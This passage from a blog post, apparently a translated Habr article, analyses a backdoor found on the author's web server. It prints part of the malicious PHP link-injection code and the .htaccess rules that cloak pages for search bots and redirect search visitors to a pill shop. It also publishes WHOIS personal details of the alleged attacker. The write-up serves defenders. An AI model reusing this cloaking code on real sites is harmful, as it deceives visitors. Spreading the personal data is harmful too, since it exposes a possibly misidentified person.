FILE_IGNORE_NEW_LINES);           $c = @count($links) - <span class="hljs-number"><span class="hljs-number">1</span></span>;           shuffle($links);           <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> ($c &gt; <span class="hljs-number"><span class="hljs-number">20</span></span>)               $c = <span class="hljs-number"><span class="hljs-number">20</span></span>;           $regexp = <span class="hljs-string"><span class="hljs-string">"&lt;a\s[^&gt;]*href=(\"??)([^\" &gt;]*?)\\1[^&gt;]*&gt;(.*)&lt;\/a&gt;"</span></span>;           <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (preg_match_all(<span class="hljs-string"><span class="hljs-string">"/$regexp/siU"</span></span>, $buf, $matches)) {               $zval = $matches[<span class="hljs-number"><span class="hljs-number">0</span></span>];               shuffle($zval);               <span class="hljs-keyword"><span class="hljs-keyword">foreach</span></span> ($zval <span class="hljs-keyword"><span class="hljs-keyword">as</span></span> $val) {                   <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> ($c &lt; <span class="hljs-number"><span class="hljs-number">0</span></span>)                       <span class="hljs-keyword"><span class="hljs-keyword">break</span></span>;                   <span class="hljs-keyword"><span class="hljs-keyword">list</span></span>($l, $anchor) = explode(<span class="hljs-string"><span class="hljs-string">"|||"</span></span>, trim($links[$c]));                   $new = <span class="hljs-string"><span class="hljs-string">'&lt;a href="'</span></span> . $l . <span class="hljs-string"><span class="hljs-string">'"&gt;'</span></span> . $anchor . <span class="hljs-string"><span class="hljs-string">'&lt;/a&gt;'</span></span>;                   $buf = str_ireplace($val, $new, $buf);                   $c--;               }           }       }       <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> $buf;   } }</code> </pre> </div></div><br>  And in short what is happening here.  First of all, there is a password check (oddly enough, there seems to be a backdoor without any password, but here).  The first block is needed to check if the backdoor worked and to unpack the files.  At the time of this writing, the files that are being downloaded from the attacker's server have been deleted. <br><br>  By the way about the server attacker.  Domain is registered as f.gghijacktest.com.  By <a href="https://whois.icann.org/en/lookup%3Fname%3Dgghijacktest.com">Whois</a> managed to find out that he belongs to the person with the data: <br><br><blockquote>  <b>Name</b> : Gabriel Northrup <br>  <b>Address</b> : str.  Ivana Cupala 1, Ljubljana NE 4111 SI <br>  <b>Telephone</b> : +714022420218 <br>  <b>Email</b> : vlasigor3@gmail.com </blockquote><br>  Maybe someone knows a person;) <br><br>  Let's go back to the code.  The files from the attacker's server are stored in a temporary directory on the server, I had the folder "~ / tmp" and I found in it a folder named .md5 (my domain), in which the modified pages of my site lay, they are needed only for bots.  Those.  in the search engine, they appear as my site, but with obscene text.  But if a user enters the site‚Äôs pages from a search engine, then the pill store was displayed to them at f.gghijacktest.com/lp.php, but the browser address, of course, shows my domain. <br><br>  All the rest, who came to the site not from search engines, or directly waited, the usual page where they try to replace the links with others, but this did not happen to me because  I have not found the corresponding <b>fff.sess</b> file. <br><br>  And now let's look at <b>.htaccess</b> : <br><br><pre> <code class="apache hljs"><span class="hljs-attribute"><span class="hljs-nomarkup"><span class="hljs-attribute"><span class="hljs-nomarkup">RewriteEngine</span></span></span></span> <span class="hljs-literal"><span class="hljs-literal">on</span></span> RewriteCond <span class="hljs-variable"><span class="hljs-variable">%{ENV:REDIRECT_STATUS}</span></span> 200 RewriteRule ^ -<span class="hljs-meta"><span class="hljs-meta"> [L] RewriteCond %{HTTP_USER_AGENT} (google|yahoo|msn|aol|bing) [OR] RewriteCond %{HTTP_REFERER} (google|yahoo|msn|aol|bing) RewriteRule ^(.*)$ bootlegger-limiter.php?$1 [L]</span></span></code> </pre> <br>  Here the most important thing happens, the redirection of bots and people from search engines to the above parsed script.  The 2nd and 3rd lines tell you to stop after the first successful application of the rules.  The following lines actually define the rules for bots and search engines and redirect them to <b>bootlegger-limiter.php</b> . <br><br>  As for the other two scripts, <b>enthusiasms-raw.php</b> and <b>equaling-intangibles.php</b> , they are exactly the same and, according to the mail function, are designed to send spam. <br><br><h1>  Conclusion </h1><br>  In such a simple way an attacker can use your server and you, probably, like me, will not even notice it.  It is worth noting that on this server I do not store anything important and therefore I look into it very rarely.  But even if I looked more often, then without suspecting anything, I might not have noticed a couple of extra files. <br><br>  In the comments you can talk about your ways of dealing with such attacks, I think many will be interested. <br><br>  I hope my experience will be useful, and you will once again check your servers for the presence of such simple backdoors.  Thanks for attention. </div><p>Source: <a href="https://habr.com/ru/post/313332/">https://habr.com/ru/post/313332/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../313320/index.html">SDN - 10 years from idea to implementation</a></li>
<li><a href="../313322/index.html">The realities of work as a game designer in a big studio on the example of BioWare</a></li>
<li><a href="../313326/index.html">Game industry: useful materials for game development from A to Z</a></li>
<li><a href="../313328/index.html">A massive DDoS on the infrastructure of the DNS provider Dyn.com led to the inaccessibility of Twitter, Github, Heroku and other sites.</a></li>
<li><a href="../313330/index.html">Binary (file) storage, a terrible tale with a gloomy end</a></li>
<li><a href="../313334/index.html">Code examples in 39 esoteric programming languages</a></li>
<li><a href="../313338/index.html">Programming & Music: Delay, Distortion and Parameter Modulation. Part 4</a></li>
<li><a href="../313340/index.html">Thematic modeling on the way to exploratory information search. Lecture in Yandex</a></li>
<li><a href="../313342/index.html">MikroTik. Correct dst nat when using 2 or more providers</a></li>
<li><a href="../313344/index.html">How to order and promote a mobile application: digest of useful materials</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>